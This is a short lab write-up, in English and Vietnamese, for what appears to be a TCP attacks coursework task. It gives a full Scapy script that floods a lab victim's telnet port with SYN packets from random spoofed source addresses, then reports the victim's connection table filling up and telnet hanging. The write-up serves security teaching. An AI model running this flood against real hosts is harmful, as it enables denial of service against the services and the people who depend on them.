# TCP Attacks
## Task 1.1: Launching the Attack using Pythong
- Attack script:
```python
#! /bin/python3

from scapy.all import IP, TCP, send
from ipaddress import IPv4Address
from random import getrandbits


ip = IP(dst="10.9.0.5")
tcp = TCP(dport=23, flags='S')
pkt = ip/tcp

while True:
    pkt[IP].src = str(IPv4Address(getrandbits(32)))
    pkt[TCP].sport = getrandbits(16)
    pkt[TCP].seq = getrandbits(32)
    send(pkt, verbose=0)
```

### Kết quả
- Tại máy victim `10.9.0.5`:
  - Rất nhiều kết nối với source IP và source port khác nhau được tạo ra:  
  
  ![image](https://user-images.githubusercontent.com/44528004/142655669-96b09f7a-78b7-42d4-a86d-525788bc6273.png)

- Thử telnet vào máy victim thì thấy là trạng thái liên tục `Trying` và không thể kết nối tới máy victim:  

![image](https://user-images.githubusercontent.com/44528004/142655862-e08bccb9-3e95-4a46-a6b7-be82ebee7865.png)
